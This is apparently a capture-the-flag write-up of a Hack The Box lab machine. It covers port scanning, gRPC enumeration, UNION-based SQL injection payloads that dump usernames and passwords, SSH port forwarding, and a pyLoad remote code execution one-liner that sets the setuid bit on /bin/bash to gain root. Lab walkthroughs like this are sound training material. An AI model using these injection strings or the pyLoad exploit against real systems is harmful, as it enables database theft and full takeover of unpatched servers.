# Recon

~~~
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.127
~~~

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.228.127            
[sudo] password for mrg0d: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 19:35 IST
Initiating SYN Stealth Scan at 19:35
Scanning 10.129.228.127 [65535 ports]
Discovered open port 22/tcp on 10.129.228.127
Discovered open port 50051/tcp on 10.129.228.127
Increasing send delay for 10.129.228.127 from 0 to 5 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.129.228.127 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.129.228.127 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
Completed SYN Stealth Scan at 19:36, 40.78s elapsed (65535 total ports)
Nmap scan report for 10.129.228.127
Host is up, received user-set (0.28s latency).
Scanned at 2023-05-22 19:35:31 IST for 40s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.91 seconds
           Raw packets sent: 196633 (8.652MB) | Rcvd: 4 (176B)
~~~

PORT SCAN

~~~
nmap -p22,80,50051 -sCV -Pn 10.129.228.127
~~~

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ nmap -p22,80,50051 -sCV -Pn 10.129.228.127
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-22 20:12 IST
Nmap scan report for 10.129.228.127
Host is up.

PORT      STATE    SERVICE VERSION
22/tcp    filtered ssh
80/tcp    filtered http
50051/tcp filtered unknown

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
~~~

When i did check about port 50051 it is GRPC server

When i googled about grpc server , i heard to know about grpcurl

~~~
grpcurl -plaintext pc.htb:50051 list
~~~

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ grpcurl -plaintext pc.htb:50051 list 
SimpleApp
grpc.reflection.v1alpha.ServerReflection

┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ grpcurl -plaintext pc.htb:50051 list SimpleApp
SimpleApp.LoginUser
SimpleApp.RegisterUser
SimpleApp.getInfo

┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ grpcurl -plaintext pc.htb:50051 describe  SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
 
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ grpcurl -plaintext pc.htb:50051 SimpleApp.LoginUser
{
  "message": "Login unsuccessful"
}
~~~

I know about grpcui

Install it using this command 

~~~
go install github.com/fullstorydev/grpcui/cmd/grpcui@latest
~~~

When i tried to login , with default credentials  admin : admin

![[Pasted image 20230522210525.png]]


![[Pasted image 20230522210420.png]]

Got this token :

~~~
token

b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3ODkzNzB9.4DinUS0RNlRCckRgqVrVar9ia0KgttJhHzoCZ9Fzd9w'
~~~

With this token..!!!

![[Pasted image 20230523005148.png]]

Now intercept the Request ..!!! We can see the parameter "id" which is Injectable to sql ...!!

Yes it is working ...!!! Can see the Sqlite version...!!

~~~
{"timeout_seconds":1,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3ODkzNzB9.4DinUS0RNlRCckRgqVrVar9ia0KgttJhHzoCZ9Fzd9w"}],"data":[{"id":"0 union SELECT sqlite_version[];"}]}
~~~

We can use alternatively sqlmap But it will take more time than u expecting..!!

![[Pasted image 20230522211300.png]]

For Usernames:

~~~
{"timeout_seconds":1,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3ODkzNzB9.4DinUS0RNlRCckRgqVrVar9ia0KgttJhHzoCZ9Fzd9w"}],"data":[{"id":"0 union SELECT GROUP_CONCAT(username) from accounts"}]}
~~~
'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3ODkzNzB9.4DinUS0RNlRCckRgqVrVar9ia0KgttJhHzoCZ9Fzd9w'

![[Pasted image 20230522234922.png]]

For Password:

~~~
{"timeout_seconds":1,"metadata":[{"name":"token","value":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ3ODkzNzB9.4DinUS0RNlRCckRgqVrVar9ia0KgttJhHzoCZ9Fzd9w"}],"data":[{"id":"0 union SELECT GROUP_CONCAT(password) from accounts"}]}
~~~


![[Pasted image 20230522234959.png]]

~~~
sudo ssh sau@10.129.228.178
~~~

![[Pasted image 20230523001216.png]]

Got user flag..!!!

## Privelege Escalation

I checked 

~~~
sudo -l
~~~

Nope ..!!cant run sudo on localhost..!!something Phishy..right..!!!


~~~
netstat -taon
~~~

I can see some service is  running on Port 8000

I port forwarded with SSH itself..!!To  see what it is ..!!

~~~
sudo ssh sau@10.129.228.178 -L 8000:127.0.0.1:8000
~~~

This command will initiate an SSH connection to the remote host at IP address 10.129.228.178 using the username "sau". It will also set up local port forwarding, where any traffic sent to port 8000 on your local machine will be forwarded to port 8000 on the remote machine (127.0.0.1 refers to the remote machine's loopback address).

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ sudo ssh sau@10.129.228.178 -L 8000:127.0.0.1:8000
The authenticity of host '10.129.228.178 (10.129.228.178)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
    ~/.ssh/known_hosts:2: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.228.178' (ED25519) to the list of known hosts.
sau@10.129.228.178's password: 
Permission denied, please try again.
sau@10.129.228.178's password: 
Last login: Mon May 22 18:27:58 2023 from 10.129.228.178
~~~

Checked My browser..!!

![[Pasted image 20230523005633.png]]

Checked for vulnerabilities for PyLoad..!!

Got so many.!!!

This is clear..!!

Reference Link : https://huntr-dev.translate.goog/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_hist=true

We just have to make the POST request...!!!

~~~
curl -X POST 127.0.0.1:8000/flash/addcrypted2 -d 'jk=pyimport%20os%3Bos%2Esystem%28%22chmod%20u%2Bs%20%2Fbin%2Fbash%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
~~~


~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ curl -X POST 127.0.0.1:8000/flash/addcrypted2 -d 'jk=pyimport%20os%3Bos%2Esystem%28%22chmod%20u%2Bs%20%2Fbin%2Fbash%22%29;f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
Could not decrypt key  
~~~~

![[Pasted image 20230523001230.png]]

Got rooted..!!!Easy Machine..!!